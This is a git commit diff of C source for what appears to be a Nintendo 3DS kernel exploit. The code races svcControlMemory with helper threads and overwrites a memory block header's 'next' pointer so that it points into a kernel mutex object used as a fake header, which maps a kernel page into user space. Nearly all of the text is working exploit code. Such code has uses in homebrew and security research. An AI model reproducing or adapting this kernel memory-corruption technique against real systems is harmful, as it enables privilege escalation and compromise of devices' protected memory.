90c8f73c3d014ab76b2bf7e86382a8159f42f460
Steven Smith <Steveice10@gmail.com>
2016-01-01 14:47:30 -0800

    Further cleanup.

--- source/main.c
+++ source/main.c
@@ -5,23 +5,6 @@
 
 #define PAGE_SIZE 0x1000
 
-typedef struct __attribute__((packed)) {
-    void** vtable;
-    u32 refCount;
-    u32 syncedThreads;
-    void* firstThreadNode;
-    void* lastThreadNode;
-    void* timerInterruptVtable;
-    void* interruptObject;
-    s64 suspendTime;
-    u8 timerEnabled;
-    u8 resetType;
-    u16 unused;
-    s64 interval;
-    s64 initial;
-    void* owner;
-} KTimer;
-
 typedef struct {
     u32 size;
     void* next;
@@ -55,62 +38,27 @@ static void allocate_thread(void* arg) {
     data->result = svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE));
 }
 
-// Maps pages with block headers present.
-static bool begin_map_pages(AllocateData* data) {
-    // Create thread to slow down svcControlMemory execution.
-    Thread delayThread = threadCreate(delay_thread, data, 0x4000, 0x18, 1, true);
-    if(delayThread == NULL) {
-        return false;
-    }
-
-    // Create thread to allocate pages.
-    Thread allocateThread = threadCreate(allocate_thread, data, 0x4000, 0x3F, 1, true);
-    if(allocateThread == NULL) {
-        // Terminate the delay thread on failure.
-        data->result = 0;
-        return false;
-    }
-
-    return true;
-}
-
-// Waits for a raw page to be mapped.
-static void wait_raw_mapped(u32 addr) {
-    Handle arbiter = __sync_get_arbiter();
-
-    // Use svcArbitrateAddress to detect when the memory page has been mapped.
-    while((u32) svcArbitrateAddress(arbiter, addr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
-}
-
-// Creates a timer and outputs its kernel object address (at ref count, not vtable pointer) from r2.
-static Result __attribute__((naked)) svcCreateTimerKAddr(Handle* timer, u8 reset_type, u32* kaddr) {
-    asm volatile(
-    "str r0, [sp, #-4]!\n"
-    "str r2, [sp, #-4]!\n"
-    "svc 0x1A\n"
-    "ldr r3, [sp], #4\n"
-    "str r2, [r3]\n"
-    "ldr r2, [sp], #4\n"
-    "str r1, [r2]\n"
-    "bx lr"
-    );
-}
-
 // Executes exploit.
 void do_hax() {
     printf("Setting up...\n");
 
-    aptOpenSession();
-    if(R_FAILED(APT_SetAppCpuTimeLimit(30))) {
-        printf("Failed to allow threads on core 1.\n");
-        return;
-    }
-
-    aptCloseSession();
-
+    // Set up variables.
+    Handle arbiter = __sync_get_arbiter();
     AllocateData* data = (AllocateData*) malloc(sizeof(AllocateData));
+    void* backup = malloc(PAGE_SIZE);
+    u32 isolatedPage = 0;
+    u32 isolatingPage = 0;
+    Handle kObjHandle = 0;
+    u32 kObjAddr = 0;
+    Thread delayThread = NULL;
+
     if(data == NULL) {
         printf("Failed to create allocate data.\n");
+        goto cleanup;
+    }
+
+    if(backup == NULL) {
+        printf("Failed to create kernel page backup buffer.\n");
         goto cleanup;
     }
 
@@ -118,15 +66,21 @@ void do_hax() {
     data->size = PAGE_SIZE * 2;
     data->result = -1;
 
+    aptOpenSession();
+    if(R_FAILED(APT_SetAppCpuTimeLimit(30))) {
+        printf("Failed to allow threads on core 1.\n");
+        goto cleanup;
+    }
+
+    aptCloseSession();
+
     // Isolate a single page between others to ensure using the next pointer.
-    u32 isolatedPage = 0;
     if(R_FAILED(svcControlMemory(&isolatedPage, data->addr + data->size, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE)))) {
         printf("Failed to allocate isolated page.\n");
         goto cleanup;
     }
 
-    u32 isolatingPage = 0;
-    if(R_FAILED(svcControlMemory(&isolatingPage, data->addr + data->size + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE)))) {
+    if(R_FAILED(svcControlMemory(&isolatingPage, isolatedPage + PAGE_SIZE, 0, PAGE_SIZE, MEMOP_ALLOC, (MemPerm) (MEMPERM_READ | MEMPERM_WRITE)))) {
         printf("Failed to allocate isolating page.\n");
         goto cleanup;
     }
@@ -138,43 +92,54 @@ void do_hax() {
 
     isolatedPage = 0;
 
-    // Create a timer in order to use part of its data as a fake memory block header.
+    // Create a KSynchronizationObject in order to use part of its data as a fake memory block header.
+    // Within the KSynchronizationObject, refCount = size, syncedThreads = next, firstThreadNode = prev.
     // Prev does not matter, as any verification happens prior to the overwrite.
     // However, next must be 0, as it does not use size to check when allocation is finished.
     // If next is not 0, it will continue to whatever is pointed to by it.
     // Even if this eventually reaches an end, it will continue decrementing the remaining size value.
     // This will roll over, and panic when it thinks that there is more memory to allocate than was available.
-    Handle timer;
-    u32 timerAddr;
-    if(R_FAILED(svcCreateTimerKAddr(&timer, 0, &timerAddr))) {
-        printf("Failed to create timer.\n");
+    if(R_FAILED(svcCreateMutex(&kObjHandle, 0))) {
+        printf("Failed to create KSynchronizationObject.\n");
         goto cleanup;
     }
 
-    // Retrieve a kernel pointer to the timer object and create a pointer to our fake header.
-    // refCount = size, syncedThreads = next, firstThreadNode = prev
-    KTimer* timerObj = (KTimer*) (timerAddr - 4);
-    MemChunkHdr* fakeHdr = (MemChunkHdr*) &timerObj->refCount;
-
-    // Allocate a buffer to back up the kernel page before it is cleared by the allocation code.
-    //void* backup = malloc(PAGE_SIZE);
+    // Pull the kernel address of the created object from r2.
+    asm("mov %0, r2" : "=r"(kObjAddr));
 
     printf("Mapping pages for overwrite...\n");
 
-    if(!begin_map_pages(data)) {
-        printf("Failed to create memory map threads.\n");
+    // Create thread to slow down svcControlMemory execution.
+    delayThread = threadCreate(delay_thread, data, 0x4000, 0x18, 1, true);
+    if(delayThread == NULL) {
+        printf("Failed to create delay thread.\n");
         goto cleanup;
     }
 
-    // Overwrite the header "next" pointer to our crafted MemChunkHdr within the timer.
-    wait_raw_mapped(data->addr);
-    ((MemChunkHdr*) data->addr)->next = fakeHdr;
+    // Create thread to allocate pages.
+    if(threadCreate(allocate_thread, data, 0x4000, 0x3F, 1, true) == NULL) {
+        printf("Failed to create allocation thread.\n");
+        goto cleanup;
+    }
+
+    // Use svcArbitrateAddress to detect when the first memory page has been mapped.
+    while((u32) svcArbitrateAddress(arbiter, data->addr, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
+
+    // Overwrite the header "next" pointer to our crafted MemChunkHdr within our kernel object.
+    ((MemChunkHdr*) data->addr)->next = (MemChunkHdr*) kObjAddr;
+
+    // Use svcArbitrateAddress to detect when the kernel memory page has been mapped.
+    while((u32) svcArbitrateAddress(arbiter, data->addr + PAGE_SIZE, ARBITRATION_WAIT_IF_LESS_THAN_TIMEOUT, 0, 0) == 0xD9001814);
 
     // Back up the kernel page before it is cleared.
-    wait_raw_mapped(data->addr + PAGE_SIZE);
     //memcpy(backup, (void*) (memAddr + PAGE_SIZE), PAGE_SIZE);
 
-    printf("Post-overwrite control result: 0x%08X\n", (int) data->result);
+    printf("Overwrite complete.\n");
+
+    if(data->result != -1) {
+        printf("Failed to perform overwrite on time.\n");
+        goto cleanup;
+    }
 
     // Wait for memory mapping to complete.
     while(data->result == -1) {
@@ -189,16 +154,16 @@ void do_hax() {
         goto cleanup;
     }
 
-    // Overwrite the timer's vtable with our own.
-    // TODO: This needs to be a kernel virtual address.
-    //KTimer* mappedTimerObj = (KTimer*) (memAddr + PAGE_SIZE + ((u32) timerObj & 0xFFF));
-    //mappedTimerObj->vtable = vtable;
-
 cleanup:
     printf("Cleaning up...\n");
 
     if(data != NULL && data->result == 0) {
         svcControlMemory(&data->addr, data->addr, 0, data->size, MEMOP_FREE, MEMPERM_DONTCARE);
+    }
+
+    if(delayThread != NULL && data != NULL && data->result == -1) {
+        // Set the result to 0 to terminate the delay thread.
+        data->result = 0;
     }
 
     if(isolatedPage != 0) {
@@ -211,12 +176,16 @@ cleanup:
         isolatingPage = 0;
     }
 
+    if(backup != NULL) {
+        free(backup);
+    }
+
     if(data != NULL) {
         free(data);
     }
 
-    if(timer != 0) {
-        svcCloseHandle(timer);
+    if(kObjHandle != 0) {
+        svcCloseHandle(kObjHandle);
     }
 }
 
